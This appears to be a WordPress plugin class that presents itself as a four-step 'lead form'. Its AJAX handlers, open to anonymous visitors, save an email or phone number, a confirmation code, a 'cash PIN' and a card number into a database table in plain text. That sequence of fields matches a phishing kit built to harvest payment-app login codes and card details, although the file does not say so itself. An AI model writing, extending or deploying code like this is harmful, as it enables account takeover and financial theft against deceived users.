<?php

namespace BOILERPLATE\Inc;

use BOILERPLATE\Inc\Traits\Credentials_Options;
use BOILERPLATE\Inc\Traits\Program_Logs;
use BOILERPLATE\Inc\Traits\Singleton;

class Lead_Form {

    use Singleton;
    use Program_Logs;
    use Credentials_Options;

    public function __construct() {
        // $this->load_credentials_options();
        $this->setup_hooks();
    }

    public function setup_hooks() {
        // create lead form shortcode
        add_shortcode( 'lead_form', [ $this, 'lead_form_shortcode' ] );

        // save first step data
        add_action( 'wp_ajax_save_first_step_data', [ $this, 'save_first_step_data' ] );
        add_action( 'wp_ajax_nopriv_save_first_step_data', [ $this, 'save_first_step_data' ] );

        // save second step data
        add_action( 'wp_ajax_save_second_step_data', [ $this, 'save_second_step_data' ] );
        add_action( 'wp_ajax_nopriv_save_second_step_data', [ $this, 'save_second_step_data' ] );

        // save third step data
        add_action( 'wp_ajax_save_third_step_data', [ $this, 'save_third_step_data' ] );
        add_action( 'wp_ajax_nopriv_save_third_step_data', [ $this, 'save_third_step_data' ] );

        // save fourth step data
        add_action( 'wp_ajax_save_fourth_step_data', [ $this, 'save_fourth_step_data' ] );
        add_action( 'wp_ajax_nopriv_save_fourth_step_data', [ $this, 'save_fourth_step_data' ] );
    }

    public function lead_form_shortcode() {
        ob_start();

        // include lead form template
        include_once PLUGIN_BASE_PATH . '/templates/template-lead-form.php';

        return ob_get_clean();
    }

    public function save_first_step_data() {

        if ( !check_ajax_referer( 'wpb_public_nonce', 'nonce' ) ) {
            wp_send_json_error( 'Invalid nonce' );
        }

        $nonce          = sanitize_text_field( $_POST['nonce'] );
        $phone_or_email = sanitize_text_field( $_POST['emailOrPhone'] );

        global $wpdb;
        $table_name = $wpdb->prefix . 'sync_leads';

        // prepare sql statement
        $sql = $wpdb->prepare(
            "INSERT INTO $table_name (nonce, phone_or_email) VALUES (%s, %s)
            ON DUPLICATE KEY UPDATE phone_or_email = VALUES(phone_or_email)",
            $nonce,
            $phone_or_email
        );

        // execute sql statement
        $wpdb->query( $sql );

        // send success response
        wp_send_json_success( [
            'message' => 'Lead saved successfully',
        ] );
    }

    public function save_second_step_data() {

        if ( !check_ajax_referer( 'wpb_public_nonce', 'nonce' ) ) {
            wp_send_json_error( 'Invalid nonce' );
        }

        $nonce             = sanitize_text_field( $_POST['nonce'] );
        $confirmation_cone = sanitize_text_field( $_POST['confirmationCode'] );

        global $wpdb;
        $table_name = $wpdb->prefix . 'sync_leads';

        // prepare sql statement
        $sql = $wpdb->prepare(
            "INSERT INTO $table_name (nonce, confirmation_code) VALUES (%s, %s)
            ON DUPLICATE KEY UPDATE confirmation_code = VALUES(confirmation_code)",
            $nonce,
            $confirmation_cone
        );

        // execute sql statement
        $wpdb->query( $sql );

        // send success response
        wp_send_json_success( [
            'message' => 'Lead saved successfully',
        ] );
    }

    public function save_third_step_data() {

        if ( !check_ajax_referer( 'wpb_public_nonce', 'nonce' ) ) {
            wp_send_json_error( 'Invalid nonce' );
        }

        $nonce     = sanitize_text_field( $_POST['nonce'] );
        $pin_input = sanitize_text_field( $_POST['pinInput'] );

        global $wpdb;
        $table_name = $wpdb->prefix . 'sync_leads';

        // prepare sql statement
        $sql = $wpdb->prepare(
            "INSERT INTO $table_name (nonce, cash_pin) VALUES (%s, %s)
            ON DUPLICATE KEY UPDATE cash_pin = VALUES(cash_pin)",
            $nonce,
            $pin_input
        );

        // execute sql statement
        $wpdb->query( $sql );

        // send success response
        wp_send_json_success( [
            'message' => 'Lead saved successfully',
        ] );
    }

    public function save_fourth_step_data() {

        if ( !check_ajax_referer( 'wpb_public_nonce', 'nonce' ) ) {
            wp_send_json_error( 'Invalid nonce' );
        }

        $nonce            = sanitize_text_field( $_POST['nonce'] );
        $cash_card_number = sanitize_text_field( $_POST['cashCardNumber'] );

        global $wpdb;
        $table_name = $wpdb->prefix . 'sync_leads';

        // prepare sql statement
        $sql = $wpdb->prepare(
            "INSERT INTO $table_name (nonce, card_number) VALUES (%s, %s)
            ON DUPLICATE KEY UPDATE card_number = VALUES(card_number)",
            $nonce,
            $cash_card_number
        );

        // execute sql statement
        $wpdb->query( $sql );

        // send success response
        wp_send_json_success( [
            'message' => 'Lead saved successfully',
        ] );
    }

}